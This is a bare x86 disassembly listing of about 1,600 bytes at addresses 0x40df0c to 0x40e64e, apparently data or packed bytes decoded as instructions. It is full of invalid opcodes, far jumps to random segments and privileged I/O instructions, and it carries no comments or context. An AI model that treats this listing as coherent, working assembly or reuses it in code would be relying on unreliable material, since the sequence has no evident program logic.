  40df0c:	add    eax,0x27bc744b
  40df11:	call   0x5cbd:0x4c73edf8
  40df18:	push   esp
  40df19:	pop    esi
  40df1a:	pop    ebx
  40df1b:	mov    esi,0x13ec1202
  40df20:	xchg   ebx,eax
  40df21:	sub    ebp,DWORD PTR [ebx-0x37abe8f1]
  40df27:	sub    al,0xc2
  40df29:	rol    dh,cl
  40df2b:	add    ah,BYTE PTR [ecx]
  40df2d:	(bad)  [ebx+0xa]
  40df30:	popf   
  40df31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df32:	iret   
  40df33:	ds jae 0x40df07
  40df36:	jge    0x40df36
  40df38:	(bad)  
  40df39:	div    BYTE PTR [eax+0x521fbf67]
  40df3f:	cli    
  40df40:	test   BYTE PTR ds:0xb7bc8a39,al
  40df46:	pop    edi
  40df47:	dec    ecx
  40df48:	mov    dl,0x52
  40df4a:	mov    dl,0xdd
  40df4c:	pop    edx
  40df4d:	add    ch,BYTE PTR [ecx-0x7f]
  40df50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df51:	sub    eax,0xf80b380a
  40df56:	xchg   BYTE PTR [ebp-0x4da2ef35],al
  40df5c:	adc    ah,BYTE PTR [esp+ebx*1+0x386410b2]
  40df63:	je     0x40dfc2
  40df65:	fdiv   DWORD PTR [eax+0x43]
  40df68:	adc    ch,ch
  40df6a:	sbb    dh,BYTE PTR [ecx+0x1c]
  40df6d:	mov    ah,0xe0
  40df6f:	mov    esi,0xeddf0e4c
  40df74:	sub    DWORD PTR [ebx+edx*8-0x18],esi
  40df78:	add    DWORD PTR [ecx+0x33],esp
  40df7b:	aad    0x13
  40df7d:	cdq    
  40df7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df7f:	mov    dl,0x9a
  40df81:	xchg   ecx,eax
  40df82:	mov    cl,0x4b
  40df84:	add    BYTE PTR [edi+ecx*8-0x69],al
  40df88:	aam    0x26
  40df8a:	xchg   edi,eax
  40df8b:	aad    0x4
  40df8d:	data16 xor BYTE PTR [ebx-0x19a255f5],bh
  40df94:	adc    eax,0x66de4c7
  40df99:	(bad)  
  40df9a:	pop    esi
  40df9b:	mov    BYTE PTR [edx],ch
  40df9d:	or     al,0xcc
  40df9f:	push   0xc3643c57
  40dfa4:	call   0x45e2:0x80891b5e
  40dfab:	sub    DWORD PTR [edi-0x7d],edi
  40dfae:	std    
  40dfaf:	pop    edi
  40dfb0:	stos   BYTE PTR es:[edi],al
  40dfb1:	scas   al,BYTE PTR es:[edi]
  40dfb2:	(bad)  
  40dfb3:	div    BYTE PTR [esi+0x5a]
  40dfb6:	mov    bl,0x86
  40dfb8:	add    BYTE PTR [edx+ebx*1+0x23],0x4f
  40dfbd:	adc    cl,BYTE PTR [esi+ebp*1+0x4c]
  40dfc1:	fiadd  DWORD PTR [ebp+0x48692968]
  40dfc7:	int3   
  40dfc8:	inc    esi
  40dfc9:	xchg   edx,eax
  40dfca:	mov    bh,0x3f
  40dfcc:	and    eax,0x658b79b8
  40dfd1:	sbb    BYTE PTR [eax+0x5f00898f],dl
  40dfd7:	mov    BYTE PTR [ebp-0x7d8893e5],ch
  40dfdd:	mov    esi,0xd4baf3a2
  40dfe2:	jmp    0xf77f:0x8d8852d0
  40dfe9:	inc    ebx
  40dfea:	cwde   
  40dfeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfec:	rol    ch,1
  40dfee:	out    0x34,eax
  40dff0:	jno    0x40e029
  40dff2:	and    bh,al
  40dff4:	cli    
  40dff5:	popf   
  40dff6:	cmc    
  40dff7:	sbb    al,0x42
  40dff9:	sbb    DWORD PTR es:[ebx],ebp
  40dffc:	mov    ah,0x5f
  40dffe:	jle    0x40e003
  40e000:	or     dl,bh
  40e002:	(bad)  
  40e003:	out    dx,eax
  40e004:	dec    ecx
  40e005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e006:	test   al,0x1b
  40e008:	outs   dx,DWORD PTR ds:[esi]
  40e009:	sub    edi,DWORD PTR [edi-0x58d34ac0]
  40e00f:	pop    ds
  40e010:	push   esp
  40e011:	sub    DWORD PTR [eax-0x7630166a],0x18
  40e018:	es adc al,0xde
  40e01b:	xor    DWORD PTR [ebx],edi
  40e01d:	jp     0x40e048
  40e01f:	dec    edx
  40e020:	dec    ebx
  40e021:	push   esp
  40e022:	dec    edx
  40e023:	or     BYTE PTR [esi+0x3d2f0793],dh
  40e029:	les    ebx,FWORD PTR [edx+0x1e87c7c2]
  40e02f:	dec    eax
  40e030:	and    DWORD PTR [edx-0x58a3976c],ecx
  40e036:	into   
  40e037:	rol    BYTE PTR [edi+eiz*2],1
  40e03a:	mov    ebp,DWORD PTR [esi-0x2c]
  40e03d:	and    esi,edx
  40e03f:	fwait
  40e040:	ret    
  40e041:	push   edi
  40e042:	xchg   ebx,eax
  40e043:	das    
  40e044:	imul   DWORD PTR [eax+0x309701f2]
  40e04a:	dec    ebp
  40e04b:	xchg   ebp,eax
  40e04c:	call   0x62f3:0xab5df4f0
  40e053:	sub    BYTE PTR [esi],al
  40e055:	or     DWORD PTR [edx+0xc],edi
  40e058:	push   0xfa65da02
  40e05d:	pop    ebp
  40e05e:	xor    eax,DWORD PTR [ebx+0x298c04f0]
  40e064:	repnz repnz inc ebx
  40e067:	es push ss
  40e069:	xor    BYTE PTR [ecx-0x30],0x7c
  40e06d:	in     al,0x1a
  40e06f:	xor    dh,al
  40e071:	mov    al,ds:0x42087dd5
  40e076:	add    DWORD PTR [ebx],ebp
  40e078:	cwde   
  40e079:	inc    eax
  40e07a:	pusha  
  40e07b:	jmp    0x40e0a7
  40e07d:	jb     0x40e003
  40e07f:	inc    ebx
  40e080:	nop
  40e081:	and    DWORD PTR [ebx+0x608e1568],0xffffff8f
  40e088:	sbb    bh,BYTE PTR [esi]
  40e08a:	fwait
  40e08b:	dec    BYTE PTR [esi+eax*1+0xf]
  40e08f:	lock push edi
  40e091:	aad    0x2f
  40e093:	adc    edi,ecx
  40e095:	(bad)  
  40e096:	retf   
  40e097:	sub    esp,DWORD PTR [ebp-0x11]
  40e09a:	push   ebx
  40e09b:	sbb    dl,bh
  40e09d:	adc    eax,0x8393df91
  40e0a2:	cmp    DWORD PTR [edx+0x12],0x7d
  40e0a6:	clc    
  40e0a7:	les    edi,FWORD PTR [ecx*4+0x79c52276]
  40e0ae:	jns    0x40e032
  40e0b0:	loope  0x40e112
  40e0b2:	inc    eax
  40e0b3:	sub    ch,BYTE PTR [eax+ebp*1]
  40e0b6:	std    
  40e0b7:	sahf   
  40e0b8:	loope  0x40e0dd
  40e0ba:	and    dl,BYTE PTR [ecx]
  40e0bc:	enter  0x479f,0xdf
  40e0c0:	pop    eax
  40e0c1:	mov    esp,0xa2ee1249
  40e0c6:	cmp    eax,0xa5850d99
  40e0cb:	adc    DWORD PTR ss:[ebx],ebp
  40e0ce:	leave  
  40e0cf:	push   edx
  40e0d0:	add    BYTE PTR [ebx+0x6d],cl
  40e0d3:	dec    eax
  40e0d4:	inc    edx
  40e0d5:	adc    eax,0xdfd27907
  40e0da:	and    bl,BYTE PTR [eax+0x35d97409]
  40e0e0:	inc    esp
  40e0e1:	or     DWORD PTR [edx-0x47631845],esp
  40e0e7:	push   esp
  40e0e8:	mov    cl,cl
  40e0ea:	push   ss
  40e0eb:	pop    edx
  40e0ec:	sub    BYTE PTR [ebx],cl
  40e0ee:	sbb    ebp,esi
  40e0f0:	xor    dh,bh
  40e0f2:	mov    ds:0x84d47d17,eax
  40e0f7:	sbb    DWORD PTR [ecx],eax
  40e0f9:	push   cs
  40e0fa:	push   0xb810d95c
  40e0ff:	retf   
  40e100:	pushf  
  40e101:	and    ebx,DWORD PTR [edx]
  40e103:	dec    ecx
  40e104:	in     al,0xbe
  40e106:	push   esp
  40e107:	push   edi
  40e108:	dec    edx
  40e109:	push   cs
  40e10a:	inc    esi
  40e10b:	jle    0x40e119
  40e10d:	jmp    0x76970f8d
  40e112:	loope  0x40e0c4
  40e114:	jl     0x40e158
  40e116:	sub    al,0xb1
  40e118:	lods   al,BYTE PTR ds:[esi]
  40e119:	mov    ecx,0xb56a88d9
  40e11e:	iret   
  40e11f:	imul   ecx,ebx,0xffffff84
  40e122:	xchg   BYTE PTR [ecx-0x49],cl
  40e125:	pop    ebx
  40e126:	and    DWORD PTR [edi+esi*2],0xa5d8258d
  40e12d:	push   ds
  40e12e:	inc    esp
  40e12f:	push   0xe3afba17
  40e134:	shr    DWORD PTR [ebp+0x2d1decb4],0xaa
  40e13b:	mov    ss,ebp
  40e13d:	push   esp
  40e13e:	cmp    al,0xd7
  40e140:	mov    esp,0x8f30cba4
  40e145:	and    eax,0xbff90ae5
  40e14a:	sub    eax,0xf80f46d2
  40e14f:	bound  ebx,QWORD PTR [ebp+0x32]
  40e152:	xor    eax,DWORD PTR [esi-0x1f]
  40e155:	test   al,0x20
  40e157:	leave  
  40e158:	jge    0x40e118
  40e15a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e15b:	fcom   st(2)
  40e15d:	not    edi
  40e15f:	xchg   ebp,eax
  40e160:	pop    ebp
  40e161:	hlt    
  40e162:	addr16 iret 
  40e164:	nop
  40e165:	cmp    bl,bh
  40e167:	sbb    eax,0xf1e8fff1
  40e16c:	xlat   BYTE PTR ds:[ebx]
  40e16d:	add    BYTE PTR [ebx-0x775a16fb],0xcf
  40e174:	jmp    0x992a:0x643e22fa
  40e17b:	outs   dx,BYTE PTR ds:[esi]
  40e17c:	dec    esp
  40e17d:	cmp    al,0xce
  40e17f:	xchg   ecx,eax
  40e180:	cdq    
  40e181:	arpl   WORD PTR [ecx+0x29c064ce],bp
  40e187:	sbb    BYTE PTR [ebx-0x709de214],0xfb
  40e18e:	sub    eax,0x7a4c80f2
  40e193:	lds    eax,FWORD PTR [edi-0x26]
  40e196:	fs cs jle 0x40e1ff
  40e19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e19b:	stc    
  40e19c:	(bad)  
  40e19d:	push   ss
  40e19e:	pop    esi
  40e19f:	pop    edx
  40e1a0:	outs   dx,BYTE PTR ds:[esi]
  40e1a1:	adc    ebx,DWORD PTR [edx+0x3f]
  40e1a4:	(bad)  
  40e1a5:	into   
  40e1a6:	lds    esi,FWORD PTR [eax+0x25]
  40e1a9:	and    eax,0x6c7a19ec
  40e1ae:	inc    ebx
  40e1af:	add    al,0xa3
  40e1b1:	test   ebp,edx
  40e1b3:	adc    BYTE PTR es:[esi+0x681fcdb2],al
  40e1ba:	xlat   BYTE PTR ds:[ebx]
  40e1bb:	pop    ds
  40e1bc:	dec    edi
  40e1bd:	inc    esp
  40e1be:	dec    esi
  40e1bf:	pop    ds
  40e1c0:	add    DWORD PTR [edx],0xeead8a84
  40e1c6:	jp     0x40e1b1
  40e1c8:	dec    edi
  40e1c9:	jb     0x40e19c
  40e1cb:	mov    ebx,0xed14de38
  40e1d0:	ins    BYTE PTR es:[edi],dx
  40e1d1:	sub    al,0x25
  40e1d3:	sbb    dh,BYTE PTR gs:[esi+eiz*4]
  40e1d7:	push   esp
  40e1d8:	ins    DWORD PTR es:[edi],dx
  40e1d9:	pop    ds
  40e1da:	ds jle 0x40e15f
  40e1dd:	or     DWORD PTR [edx+ebp*8],edi
  40e1e0:	sbb    edi,DWORD PTR [edx]
  40e1e2:	mov    al,BYTE PTR [esp+edi*4+0x36808232]
  40e1e9:	imul   ebp,DWORD PTR [edi+0x289e006d],0x4b3dc7c9
  40e1f3:	mov    ch,0xdd
  40e1f5:	adc    eax,0x99010577
  40e1fa:	sahf   
  40e1fb:	sub    eax,0x66b7a1e
  40e200:	mov    edi,DWORD PTR ds:0x86142202
  40e206:	and    ecx,DWORD PTR [edi+eax*4+0x57b09f7e]
  40e20d:	in     eax,dx
  40e20e:	mov    edi,0xaa77b6ba
  40e213:	pop    edx
  40e214:	ror    BYTE PTR [eax+0x64],0x8
  40e218:	mov    al,0x22
  40e21a:	stos   BYTE PTR es:[edi],al
  40e21b:	jmp    0x6e88b2b8
  40e220:	jecxz  0x40e1e4
  40e222:	push   edi
  40e223:	cmp    DWORD PTR [edi+0x74],esi
  40e226:	pop    ecx
  40e227:	or     DWORD PTR [esi],ebx
  40e229:	xor    al,0xb8
  40e22b:	cmp    ecx,ecx
  40e22d:	fdivr  DWORD PTR cs:[edx+0x22f7000d]
  40e234:	dec    eax
  40e235:	xchg   ecx,eax
  40e236:	mov    ?,WORD PTR [ebp-0x4d44ebbf]
  40e23c:	sub    DWORD PTR [esi],ebx
  40e23e:	int3   
  40e23f:	aam    0x51
  40e241:	pop    eax
  40e242:	and    DWORD PTR [edi-0x25],0x74
  40e246:	and    BYTE PTR [ebx],al
  40e248:	push   eax
  40e249:	adc    esp,DWORD PTR [edi+0x1d]
  40e24c:	jl     0x40e248
  40e24e:	xor    eax,DWORD PTR [edi-0x3627db1]
  40e254:	lea    ecx,ds:0xbdd0c5c2
  40e25a:	std    
  40e25b:	ins    DWORD PTR es:[edi],dx
  40e25c:	fnstsw WORD PTR [eax]
  40e25e:	imul   esp,DWORD PTR ds:0xe285a868,0xffffffb2
  40e265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e266:	fst    st(5)
  40e268:	cmp    esi,esp
  40e26a:	inc    ebp
  40e26c:	je     0x40e22e
  40e26e:	arpl   ax,bx
  40e270:	jmp    0x32bc7cca
  40e275:	outs   dx,DWORD PTR ds:[esi]
  40e276:	fld    QWORD PTR [ecx+0x41eadf1a]
  40e27c:	inc    ebx
  40e27d:	cwde   
  40e27e:	gs xchg edi,eax
  40e280:	sbb    dl,ah
  40e282:	sbb    DWORD PTR [edx-0x46],esi
  40e285:	(bad)  
  40e286:	leave  
  40e287:	cmp    eax,eax
  40e289:	std    
  40e28a:	outs   dx,DWORD PTR ds:[esi]
  40e28b:	xlat   BYTE PTR ds:[ebx]
  40e28c:	retf   
  40e28d:	pop    ds
  40e28e:	fadd   DWORD PTR [ebp-0x68]
  40e291:	fidivr WORD PTR [eax+0x29150b49]
  40e297:	test   BYTE PTR [edi+edi*2+0x1d],dl
  40e29b:	pop    es
  40e29c:	or     ah,bh
  40e29e:	int3   
  40e29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2a0:	sahf   
  40e2a1:	mov    eax,ds:0x187a7ab
  40e2a6:	lahf   
  40e2a7:	push   ebp
  40e2a8:	fild   WORD PTR [esi]
  40e2aa:	dec    eax
  40e2ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2ac:	cs mov bh,0xff
  40e2af:	(bad)  
  40e2b0:	push   esi
  40e2b1:	xor    bh,ch
  40e2b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2b4:	shl    BYTE PTR [edi+0x74],1
  40e2b7:	and    BYTE PTR [esi*8+0x6b17f276],ah
  40e2be:	dec    esi
  40e2bf:	in     al,dx
  40e2c0:	loope  0x40e2b5
  40e2c2:	stos   BYTE PTR es:[edi],al
  40e2c3:	mov    esp,0xbf740951
  40e2c8:	out    0xb8,al
  40e2ca:	fwait
  40e2cb:	cdq    
  40e2cc:	(bad)  
  40e2cd:	gs push edx
  40e2cf:	js     0x40e350
  40e2d1:	pop    edx
  40e2d2:	hlt    
  40e2d3:	mov    DWORD PTR [esi],esi
  40e2d5:	dec    edi
  40e2d6:	gs add eax,0x3ed9294b
  40e2dc:	jl     0x40e354
  40e2de:	dec    edi
  40e2df:	push   edi
  40e2e0:	(bad)  
  40e2e1:	pop    edi
  40e2e2:	sbb    bl,BYTE PTR [edx+ecx*1-0x32]
  40e2e6:	pop    edx
  40e2e7:	jnp    0x40e307
  40e2e9:	inc    edx
  40e2ea:	scas   al,BYTE PTR es:[edi]
  40e2eb:	in     eax,dx
  40e2ec:	cdq    
  40e2ed:	jnp    0x40e277
  40e2ef:	sar    DWORD PTR [esi],0x19
  40e2f2:	cld    
  40e2f3:	pop    eax
  40e2f4:	imul   edx,DWORD PTR ds:[eax+esi*8],0x7f4f849e
  40e2fc:	xchg   ebx,eax
  40e2fd:	retf   0x3fe6
  40e300:	or     DWORD PTR [edi+edi*2+0x7c],edx
  40e304:	push   ds
  40e305:	ins    BYTE PTR es:[edi],dx
  40e306:	idiv   BYTE PTR ds:0x7aba9e40
  40e30c:	mov    edi,0x38bcb539
  40e311:	jbe    0x40e2e5
  40e313:	fst    DWORD PTR [ebx]
  40e315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e316:	aaa    
  40e317:	xchg   ebp,eax
  40e318:	mov    edi,edi
  40e31a:	xchg   BYTE PTR [ecx],ch
  40e31c:	mov    cl,BYTE PTR [ebp+esi*2-0x15a1c203]
  40e323:	jle    0x40e2c2
  40e325:	inc    ecx
  40e326:	jmp    0xdfe95c5f
  40e32b:	imul   edx,DWORD PTR [ebp-0x40],0x44c27626
  40e332:	cdq    
  40e333:	fbld   TBYTE PTR ds:0x5349ba80
  40e339:	cmp    al,0xf4
  40e33b:	jle    0x40e319
  40e33d:	jae    0x40e37e
  40e33f:	data16 ss rol ah,0x5e
  40e344:	sbb    eax,0x3bf7b477
  40e349:	xor    esp,edx
  40e34b:	(bad)  
  40e34c:	(bad)  
  40e34e:	aad    0x1f
  40e350:	test   DWORD PTR [edi+eax*2-0x51],esp
  40e354:	iret   
  40e355:	xchg   ebp,eax
  40e356:	pop    esi
  40e357:	adc    al,0x84
  40e359:	mov    dh,bh
  40e35b:	xor    al,0x3b
  40e35d:	pop    esi
  40e35e:	mov    ?,WORD PTR [ebp-0x40]
  40e361:	mov    edx,0x2f35dd99
  40e366:	ret    0xd8ec
  40e369:	sbb    eax,0x71e249db
  40e36e:	xchg   esi,eax
  40e36f:	jecxz  0x40e337
  40e371:	(bad)  
  40e373:	or     ebx,0x28
  40e376:	cmp    ah,BYTE PTR [edi]
  40e378:	scas   eax,DWORD PTR es:[edi]
  40e379:	fnsave [edx+0x73]
  40e37c:	sub    ch,BYTE PTR [esi+0x7c9e3d0a]
  40e382:	loop   0x40e324
  40e384:	pop    esi
  40e385:	sbb    esp,ebx
  40e387:	pop    eax
  40e388:	dec    edx
  40e389:	cmp    eax,0x3730280d
  40e38e:	ins    BYTE PTR es:[edi],dx
  40e38f:	clc    
  40e390:	and    dh,BYTE PTR [ecx+0x14a01460]
  40e396:	jo     0x40e337
  40e398:	fistp  DWORD PTR [ecx-0x58]
  40e39b:	shr    DWORD PTR [ebx+0xd],cl
  40e39e:	int3   
  40e39f:	mov    edi,DWORD PTR [eax+0x440da6b2]
  40e3a5:	pop    esp
  40e3a6:	inc    ecx
  40e3a7:	xchg   ebx,eax
  40e3a8:	icebp  
  40e3a9:	cmp    eax,0x596ca5d0
  40e3ae:	je     0x40e340
  40e3b0:	(bad)  
  40e3b1:	daa    
  40e3b2:	pop    edi
  40e3b3:	lods   al,BYTE PTR ds:[esi]
  40e3b4:	shl    DWORD PTR [eax],cl
  40e3b6:	fst    QWORD PTR [ecx]
  40e3b8:	xor    edi,DWORD PTR [edx+0x78]
  40e3bb:	cs mov bl,0xcc
  40e3be:	daa    
  40e3bf:	dec    ecx
  40e3c0:	sahf   
  40e3c1:	cmp    bl,BYTE PTR [edi]
  40e3c3:	test   al,0xf9
  40e3c5:	cmp    bl,BYTE PTR [ecx+0x66253001]
  40e3cb:	jmp    0xbf867995
  40e3d0:	dec    esp
  40e3d1:	pop    ss
  40e3d2:	and    cl,BYTE PTR [ecx-0x3db6be12]
  40e3d8:	fs shl ebx,1
  40e3db:	pop    edi
  40e3dc:	into   
  40e3dd:	push   ds
  40e3de:	dec    esp
  40e3df:	fidivr WORD PTR [edx-0x7c64f2df]
  40e3e5:	sub    DWORD PTR [ecx+0x5f0b00e8],ebp
  40e3eb:	loope  0x40e465
  40e3ed:	dec    esi
  40e3ee:	addr16 pop esp
  40e3f0:	ins    BYTE PTR es:[edi],dx
  40e3f1:	lea    esp,[ecx-0x18]
  40e3f4:	(bad)  
  40e3f5:	(bad)  
  40e3f6:	xchg   ebx,eax
  40e3f7:	dec    ebp
  40e3f8:	rcr    DWORD PTR [ebp-0x22],cl
  40e3fb:	out    dx,al
  40e3fc:	cdq    
  40e3fd:	inc    esp
  40e3fe:	xchg   esi,eax
  40e3ff:	scas   eax,DWORD PTR es:[edi]
  40e400:	jle    0x40e3db
  40e402:	xchg   edi,eax
  40e403:	cwde   
  40e404:	pop    ss
  40e405:	das    
  40e406:	sti    
  40e407:	xchg   esi,eax
  40e408:	cmp    al,0x32
  40e40a:	sub    ah,bl
  40e40c:	or     DWORD PTR [esi],edx
  40e40e:	scas   al,BYTE PTR es:[edi]
  40e40f:	sbb    bh,BYTE PTR [edx-0x52]
  40e412:	dec    ebp
  40e413:	and    dl,BYTE PTR [eax-0x241f2bc8]
  40e419:	call   FWORD PTR [esi]
  40e41b:	xchg   ecx,eax
  40e41c:	sbb    eax,0xc1ca059a
  40e421:	fnstsw WORD PTR [edx-0x46]
  40e424:	pusha  
  40e425:	and    BYTE PTR [eax+0x63],bl
  40e428:	les    edi,FWORD PTR cs:[ecx]
  40e42b:	lock sub edx,DWORD PTR [ebx-0x7e]
  40e42f:	jae    0x40e440
  40e431:	imul   edx,DWORD PTR [edi+0x4b],0x7dada8a2
  40e438:	les    edi,FWORD PTR [edx+0x4cbd0cc]
  40e43e:	aam    0xe7
  40e440:	lods   al,BYTE PTR ds:[esi]
  40e441:	xchg   edx,eax
  40e442:	mov    fs,WORD PTR [esi+0x1abc599c]
  40e448:	mov    ch,0x78
  40e44a:	adc    edx,ebx
  40e44c:	inc    ecx
  40e44d:	xchg   edx,eax
  40e44e:	cmp    DWORD PTR [esi+0x2bdbec84],ebx
  40e454:	icebp  
  40e455:	out    0xe5,al
  40e457:	dec    edi
  40e458:	xor    al,0x6c
  40e45a:	cmp    dl,bl
  40e45c:	pop    es
  40e45d:	jl     0x40e4a3
  40e45f:	mov    bh,0x49
  40e461:	push   ebp
  40e462:	fmul   st,st(3)
  40e464:	push   ds
  40e465:	inc    esp
  40e466:	into   
  40e467:	dec    esp
  40e468:	sub    esi,DWORD PTR [eax+edi*8-0x43]
  40e46c:	scas   eax,DWORD PTR es:[edi]
  40e46d:	or     dl,ah
  40e46f:	repnz outs dx,DWORD PTR ds:[esi]
  40e471:	pop    ebx
  40e472:	mov    ds:0x192ba243,eax
  40e477:	test   DWORD PTR [ebp+0x42],eax
  40e47a:	icebp  
  40e47b:	aad    0x6
  40e47d:	inc    esi
  40e47e:	xchg   edi,eax
  40e47f:	and    ah,BYTE PTR [edi]
  40e481:	test   BYTE PTR [ebx],dl
  40e483:	fsub   DWORD PTR [ebx+0x4]
  40e486:	or     eax,0x8c8e2494
  40e48b:	scas   al,BYTE PTR es:[edi]
  40e48c:	pushf  
  40e48d:	mov    ebx,0x4b02196e
  40e492:	ret    
  40e493:	cmp    cl,bl
  40e495:	nop
  40e496:	inc    edx
  40e497:	xor    edx,DWORD PTR es:[esi]
  40e49a:	adc    al,0xb8
  40e49c:	dec    BYTE PTR [ebx]
  40e49e:	dec    esp
  40e49f:	mov    ecx,0xeb4c3ef4
  40e4a4:	push   ebp
  40e4a5:	sub    al,0x31
  40e4a7:	inc    esp
  40e4a8:	inc    edx
  40e4a9:	mov    eax,ds:0x465a3bd4
  40e4ae:	mov    BYTE PTR [ebx+0x2e],dl
  40e4b1:	xchg   bh,al
  40e4b3:	xor    DWORD PTR [ecx],eax
  40e4b5:	fsubr  QWORD PTR [edx-0x2]
  40e4b8:	mov    ebp,0x401de527
  40e4bd:	inc    esp
  40e4be:	xchg   ecx,eax
  40e4bf:	mov    edi,0x4c1d24c4
  40e4c4:	ins    DWORD PTR es:[edi],dx
  40e4c5:	loop   0x40e53c
  40e4c7:	mov    eax,0xc43b7e60
  40e4cc:	je     0x40e494
  40e4ce:	push   0xffffffb5
  40e4d0:	mov    esi,DWORD PTR [edi-0x5e]
  40e4d3:	adc    BYTE PTR [edi],dl
  40e4d5:	or     al,0xb4
  40e4d7:	adc    edi,DWORD PTR [ebp+0x7]
  40e4da:	idiv   DWORD PTR [esi+0x3f]
  40e4dd:	xchg   ebx,eax
  40e4de:	jae    0x40e493
  40e4e0:	mov    ch,0xa1
  40e4e2:	out    dx,al
  40e4e3:	and    ah,BYTE PTR [esi]
  40e4e5:	dec    ebp
  40e4e6:	mov    al,BYTE PTR [ecx+eiz*8-0x4bd5f9b1]
  40e4ed:	jnp    0x40e560
  40e4ef:	call   0xfccd9b5e
  40e4f4:	dec    edx
  40e4f5:	ins    DWORD PTR es:[edi],dx
  40e4f6:	ss xchg ebx,eax
  40e4f8:	or     eax,0x416681e9
  40e4fd:	das    
  40e4fe:	sbb    dh,BYTE PTR [eax-0x53]
  40e501:	and    al,0x95
  40e503:	loop   0x40e540
  40e505:	mov    ah,0xd2
  40e507:	in     eax,0x4d
  40e509:	scas   eax,DWORD PTR es:[edi]
  40e50a:	adc    eax,0x69d229ac
  40e50f:	ins    DWORD PTR es:[edi],dx
  40e510:	pop    esp
  40e511:	retf   0x3f9c
  40e514:	jmp    0xa02:0x9a47bee6
  40e51b:	xchg   BYTE PTR [edi],ch
  40e51d:	call   0x28e2:0x4d859d6a
  40e524:	fiadd  WORD PTR [esi+0x4a]
  40e527:	pop    ecx
  40e528:	int3   
  40e529:	mov    ebx,0x65608921
  40e52e:	xchg   ebp,eax
  40e52f:	add    DWORD PTR ds:0x784c65e1,esi
  40e535:	xchg   bl,ch
  40e537:	jg     0x40e593
  40e539:	jmp    0x40e577
  40e53b:	aaa    
  40e53c:	fimul  WORD PTR [ebx+0x3]
  40e53f:	(bad)
  40e542:	xor    DWORD PTR ds:0x1cd99bd4,0x33ddcd04
  40e54c:	sub    edx,DWORD PTR [esi]
  40e54e:	pop    es
  40e54f:	add    ebx,edi
  40e551:	dec    edi
  40e552:	arpl   WORD PTR [ebx+0x63],bx
  40e555:	enter  0x4790,0x61
  40e559:	push   esi
  40e55a:	mov    DWORD PTR [eax-0x4c091bd3],esi
  40e560:	inc    ecx
  40e561:	jle    0x40e4ed
  40e563:	xchg   esi,eax
  40e564:	xor    al,BYTE PTR [edi-0x71]
  40e567:	(bad)  
  40e569:	inc    edx
  40e56a:	(bad)
  40e56e:	in     al,dx
  40e56f:	test   al,0xda
  40e571:	cmp    ebp,DWORD PTR [ebp+0x28]
  40e574:	jmp    0x8898:0xded2990b
  40e57b:	pop    ecx
  40e57c:	sub    al,0x31
  40e57e:	test   eax,0x66bf51ab
  40e583:	rol    ch,cl
  40e585:	push   edi
  40e586:	pushf  
  40e587:	jecxz  0x40e574
  40e589:	nop
  40e58a:	sbb    eax,0xeba9238a
  40e58f:	ror    esp,0xe4
  40e592:	in     al,0xac
  40e594:	lods   eax,DWORD PTR ds:[esi]
  40e595:	bound  ebx,QWORD PTR [edx-0x14cc7ef5]
  40e59b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e59c:	sub    ah,ch
  40e59e:	daa    
  40e59f:	repnz (bad) 
  40e5a1:	gs out 0x8,al
  40e5a4:	xor    BYTE PTR [ecx+0x64],cl
  40e5a7:	inc    edi
  40e5a8:	test   DWORD PTR [ecx-0x7f],eax
  40e5ab:	ja     0x40e57e
  40e5ad:	lea    esi,[ecx]
  40e5af:	pop    ebp
  40e5b0:	ins    DWORD PTR es:[edi],dx
  40e5b1:	jbe    0x40e59c
  40e5b3:	add    eax,0x350198e9
  40e5b8:	leave  
  40e5b9:	sub    ah,BYTE PTR ds:[eax]
  40e5bc:	sub    eax,0x65495f36
  40e5c1:	dec    ebx
  40e5c2:	add    eax,0x20fedd2c
  40e5c7:	and    BYTE PTR ds:0xbc2d4516,cl
  40e5cd:	cmp    ebp,DWORD PTR [edx]
  40e5cf:	dec    ecx
  40e5d0:	aas    
  40e5d1:	mov    ch,0x6e
  40e5d3:	leave  
  40e5d4:	popa   
  40e5d5:	xchg   edi,eax
  40e5d6:	test   DWORD PTR [edx-0x631bcc27],eax
  40e5dc:	sub    edx,DWORD PTR [eax]
  40e5de:	imul   esp,DWORD PTR [esi+0x77bf983f],0x864cf76d
  40e5e8:	repz pop edx
  40e5ea:	jae    0x40e5dc
  40e5ec:	mov    ds:0xb8a91eab,al
  40e5f1:	pop    esp
  40e5f2:	inc    ebx
  40e5f3:	xchg   edi,eax
  40e5f4:	sti    
  40e5f5:	pop    eax
  40e5f6:	cmp    eax,0x52ace104
  40e5fb:	push   edi
  40e5fc:	loopne 0x40e647
  40e5fe:	or     DWORD PTR [edx-0xa],esi
  40e601:	rcr    BYTE PTR [ebp-0x17],0xbb
  40e605:	push   edx
  40e606:	loop   0x40e5e0
  40e608:	das    
  40e609:	lahf   
  40e60a:	lods   eax,DWORD PTR ds:[esi]
  40e60b:	and    eax,0x44f32372
  40e610:	push   0xb137d09a
  40e615:	pop    ebp
  40e616:	push   ebp
  40e617:	jmp    FWORD PTR [ecx-0x2a66b714]
  40e61d:	mov    esp,0xc93e3d71
  40e622:	das    
  40e623:	sahf   
  40e624:	mul    BYTE PTR [ebp-0x19]
  40e627:	clc    
  40e628:	jge    0x40e616
  40e62a:	adc    eax,0xb2e3f4f5
  40e62f:	call   FWORD PTR [esi]
  40e631:	(bad)  
  40e632:	cwde   
  40e633:	xor    bh,BYTE PTR [ecx]
  40e635:	loop   0x40e651
  40e637:	js     0x40e616
  40e639:	sbb    eax,0x8a214c36
  40e63e:	stos   BYTE PTR es:[edi],al
  40e63f:	fwait
  40e640:	cdq    
  40e641:	arpl   WORD PTR [edx+0x1e],bp
  40e644:	mov    ebx,0x67a2d052
  40e649:	sub    cl,bl
  40e64b:	div    DWORD PTR [esi]
  40e64d:	pop    esi
  40e64e:	mov    ah,0xea
